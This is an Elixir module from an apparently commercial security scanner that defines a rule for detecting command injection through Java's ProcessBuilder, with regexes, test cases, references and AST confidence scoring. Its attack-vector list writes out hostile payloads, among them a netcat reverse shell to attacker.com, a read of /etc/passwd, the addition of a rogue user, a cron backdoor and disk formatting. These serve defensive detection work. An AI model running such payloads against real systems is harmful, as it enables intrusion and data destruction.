defmodule RsolvApi.Security.Patterns.Java.CommandInjectionProcessbuilder do
  @moduledoc """
  Command Injection via ProcessBuilder pattern for Java code.
  
  Detects command injection vulnerabilities where user input is passed to ProcessBuilder
  with shell invocation. ProcessBuilder is generally safer than Runtime.exec(), but can
  still be vulnerable when used with shell programs like sh -c or cmd /c.
  
  ## Vulnerability Details
  
  ProcessBuilder is Java's preferred API for creating operating system processes. While it's
  safer than Runtime.exec() when used properly (with separate arguments), it becomes vulnerable
  when developers pass shell programs (sh, bash, cmd) with the -c flag, which causes the shell
  to interpret the entire command string, including any injected shell metacharacters.
  
  ### Attack Example
  
  ```java
  // Vulnerable code
  String userInput = request.getParameter("command");
  ProcessBuilder pb = new ProcessBuilder("sh", "-c", "echo " + userInput);
  Process p = pb.start();
  
  // Attack: userInput = "hello; cat /etc/passwd"
  // Results in: sh -c "echo hello; cat /etc/passwd"
  // Executes both echo and cat commands
  ```
  
  ## References
  
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command
  - OWASP A03:2021 - Injection
  """
  
  use RsolvApi.Security.Patterns.PatternBase
  alias RsolvApi.Security.Pattern
  
  @impl true
  def pattern do
    %Pattern{
      id: "java-command-injection-processbuilder",
      name: "Command Injection via ProcessBuilder",
      description: "String concatenation in ProcessBuilder.command() can lead to command injection",
      type: :command_injection,
      severity: :high,
      languages: ["java"],
      regex: [
        # ProcessBuilder.command() with concatenation
        ~r/^(?!.*\/\/).*\.command\s*\(\s*[^)]*\+[^)]*\)/m,
        # new ProcessBuilder() with shell and concatenation
        ~r/^(?!.*\/\/).*new\s+ProcessBuilder\s*\(\s*["'](?:sh|bash|cmd|powershell)['"]/im,
        # ProcessBuilder with shell flags (-c, /c) near user input
        ~r/^(?!.*\/\/).*ProcessBuilder[^;{]*["'](?:sh|bash|cmd|powershell|\/bin\/bash)["']\s*,\s*["'](?:-c|\/c|\/C|-Command)["']/im,
        # List/Arrays.asList with shell commands and variables
        ~r/(?:Arrays\.asList|List<String>|ArrayList).*["'](?:sh|bash|cmd)["']/i,
        # ProcessBuilder instantiation with concatenation in arguments
        ~r/^(?!.*\/\/).*new\s+ProcessBuilder\s*\([^)]*\+[^)]*\)/m,
        # command() method with shell programs
        ~r/\.command\s*\(\s*["'](?:sh|bash|cmd|powershell)["']\s*,\s*["'](?:-c|\/c|\/C|-Command)["']/i,
        # ProcessBuilder with /bin/bash or similar
        ~r/^(?!.*\/\/).*ProcessBuilder\s*\(\s*["']\/bin\/(?:bash|sh)["']/m,
        # add() calls for shell command construction
        ~r/\.add\s*\(\s*["'](?:bash|sh|cmd)["']\s*\)/i
      ],
      default_tier: :ai,
      cwe_id: "CWE-78",
      owasp_category: "A03:2021",
      recommendation: "Use ProcessBuilder with separate arguments and validate input",
      test_cases: %{
        vulnerable: [
          ~S|ProcessBuilder pb = new ProcessBuilder();
pb.command("sh", "-c", userCommand);|,
          ~S|new ProcessBuilder().command("cmd", "/c", command + args);|
        ],
        safe: [
          ~S|ProcessBuilder pb = new ProcessBuilder("echo", message);|,
          ~S|List<String> command = Arrays.asList("grep", pattern, "file.txt");
ProcessBuilder pb = new ProcessBuilder(command);|
        ]
      }
    }
  end
  
  @impl true
  def vulnerability_metadata do
    %{
      description: """
      Command injection through ProcessBuilder occurs when untrusted user input is passed
      to shell interpreters via ProcessBuilder's command method. While ProcessBuilder is
      inherently safer than Runtime.exec() because it doesn't invoke a shell by default,
      developers often explicitly invoke shells (sh, bash, cmd) to gain access to shell
      features like pipes, redirections, and command chaining.
      
      The vulnerability arises when using shell programs with their command execution flags:
      - Unix/Linux: sh -c, bash -c, /bin/sh -c
      - Windows: cmd /c, cmd.exe /c, powershell -Command
      
      When these patterns are combined with string concatenation of user input, attackers
      can inject arbitrary commands that will be executed with the application's privileges.
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-78",
          title: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
          url: "https://cwe.mitre.org/data/definitions/78.html"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          title: "OWASP Top 10 2021 - A03 Injection",
          url: "https://owasp.org/Top10/A03_2021-Injection/"
        },
        %{
          type: :research,
          id: "processbuilder_security",
          title: "On Command Injection over Java's ProcessBuilder",
          url: "https://medium.com/codex/on-command-injection-over-javas-processbuilder-8d9f833c808c"
        },
        %{
          type: :research,
          id: "java_command_injection",
          title: "Command Injection in Java: Examples and Prevention",
          url: "https://www.stackhawk.com/blog/command-injection-java/"
        },
        %{
          type: :tool,
          id: "semgrep_java",
          title: "Command injection prevention for Java - Semgrep",
          url: "https://semgrep.dev/docs/cheat-sheets/java-command-injection"
        }
      ],
      attack_vectors: [
        "Command chaining: sh -c \"echo \" + userInput where userInput = 'hello; cat /etc/passwd'",
        "Command substitution: bash -c \"echo \" + name where name = '$(whoami)'",
        "Pipe injection: cmd /c \"type \" + file where file = 'data.txt | net user hacker password /add'",
        "Background execution: sh -c \"process \" + args where args = 'data & nc -e /bin/sh attacker.com 4444 &'",
        "Output redirection: sh -c \"echo \" + text where text = 'data > /etc/cron.d/backdoor'",
        "Shell metacharacters: cmd /c \"dir \" + path where path = 'C:\\ & format C: /y'",
        "Environment manipulation: sh -c cmd where cmd contains 'PATH=/tmp:$PATH malicious'"
      ],
      real_world_impact: [
        "Remote code execution with application privileges",
        "Complete system compromise through reverse shells",
        "Data theft via command output or network exfiltration",
        "Denial of service by killing processes or consuming resources",
        "Privilege escalation if application runs as privileged user",
        "Lateral movement in containerized environments",
        "Cryptocurrency mining through injected processes"
      ],
      cve_examples: [
        %{
          id: "CVE-2018-1335",
          description: "Apache Tika command injection via ProcessBuilder in OCR parsing",
          severity: "high",
          cvss: 7.5,
          note: "Allowed remote attackers to execute arbitrary OS commands via crafted headers"
        },
        %{
          id: "CVE-2022-22965",
          description: "Spring Framework RCE (Spring4Shell) could chain to ProcessBuilder execution",
          severity: "critical",
          cvss: 9.8,
          note: "While primarily a different vulnerability, often exploited via ProcessBuilder command injection"
        }
      ],
      detection_notes: """
      This pattern detects ProcessBuilder usage with potential command injection:
      - ProcessBuilder.command() calls with string concatenation
      - Shell invocation patterns (sh -c, cmd /c) with user input
      - List-based command construction with dynamic elements
      - Common shell programs and their execution flags
      
      The pattern specifically looks for the combination of ProcessBuilder method calls
      and string concatenation operators that could introduce user input.
      """,
      safe_alternatives: [
        "Use ProcessBuilder with array arguments: new ProcessBuilder(\"echo\", userInput)",
        "Avoid shell invocation entirely - use direct commands",
        "If shell features needed, validate input against strict allowlist",
        "Use ProcessBuilder(List<String>) with validated individual arguments",
        "Consider Java APIs instead of external commands when possible",
        "Implement proper input sanitization removing shell metacharacters",
        "Use security libraries like OWASP ESAPI for command execution",
        "Run processes in restricted environments with minimal privileges"
      ],
      additional_context: %{
        common_mistakes: [
          "Thinking ProcessBuilder is always safe (it's not with shells)",
          "Using shell invocation for simple tasks that don't need it",
          "Concatenating commands instead of using argument arrays",
          "Not understanding shell metacharacter interpretation",
          "Trusting user input even from authenticated sources"
        ],
        secure_patterns: [
          "Always use ProcessBuilder with separate arguments",
          "Avoid invoking shells unless absolutely necessary",
          "Validate all input against strict allowlists",
          "Use Java APIs instead of external commands",
          "Monitor and log all process executions"
        ],
        processbuilder_vs_runtime: [
          "ProcessBuilder doesn't use shell by default (safer)",
          "Runtime.exec() tokenizes space-separated strings (dangerous)",
          "ProcessBuilder allows better control over environment",
          "Both are vulnerable when shells are explicitly invoked"
        ]
      }
    }
  end
  
  @doc """
  Returns AST enhancement rules to reduce false positives.
  
  This enhancement helps distinguish between actual command injection vulnerabilities
  and safe ProcessBuilder usage patterns.
  
  ## Examples
  
      iex> enhancement = RsolvApi.Security.Patterns.Java.CommandInjectionProcessbuilder.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
      
      iex> enhancement = RsolvApi.Security.Patterns.Java.CommandInjectionProcessbuilder.ast_enhancement()
      iex> enhancement.min_confidence
      0.7
      
      iex> enhancement = RsolvApi.Security.Patterns.Java.CommandInjectionProcessbuilder.ast_enhancement()
      iex> enhancement.ast_rules.node_type
      "MethodInvocation"
  """
  @impl true
  def ast_enhancement do
    %{
      ast_rules: %{
        node_type: "MethodInvocation",
        processbuilder_analysis: %{
          check_method_name: true,
          builder_methods: ["command", "ProcessBuilder", "new ProcessBuilder"],
          check_shell_invocation: true,
          check_argument_construction: true
        },
        shell_detection: %{
          check_shell_programs: true,
          shell_programs: ["sh", "bash", "ksh", "zsh", "cmd", "cmd.exe", "powershell", "powershell.exe"],
          shell_flags: ["-c", "/c", "-Command", "/Command"],
          high_risk_combination: true
        },
        concatenation_analysis: %{
          check_operators: true,
          dangerous_operators: ["+", "concat", "StringBuilder.append", "String.format"],
          check_list_construction: true,
          list_methods: ["Arrays.asList", "List.of", "ArrayList.add"]
        },
        variable_analysis: %{
          check_user_input_sources: true,
          input_sources: [
            "getParameter", "getHeader", "getCookie", "getQueryString",
            "getInputStream", "getReader", "readLine", "Scanner"
          ],
          check_variable_flow: true
        }
      },
      context_rules: %{
        check_static_commands: true,
        safe_patterns: [
          "Constant string arguments only",
          "No shell program invocation",
          "ProcessBuilder with array constructor",
          "Individual validated arguments"
        ],
        check_user_input: true,
        validation_patterns: [
          "Pattern.matches",
          "allowlist.contains",
          "isValidCommand",
          "sanitizeInput"
        ],
        shell_necessity_check: [
          "Could use direct command instead",
          "Shell features not actually needed",
          "Java API alternative available"
        ]
      },
      confidence_rules: %{
        base: 0.5,
        adjustments: %{
          "has_shell_invocation" => 0.4,
          "has_string_concatenation" => 0.3,
          "has_user_input_source" => 0.3,
          "uses_shell_metacharacters" => 0.3,
          "uses_argument_array" => -0.6,
          "no_shell_program" => -0.7,
          "has_input_validation" => -0.5,
          "is_static_command" => -0.8,
          "in_test_code" => -0.5
        }
      },
      min_confidence: 0.7
    }
  end
end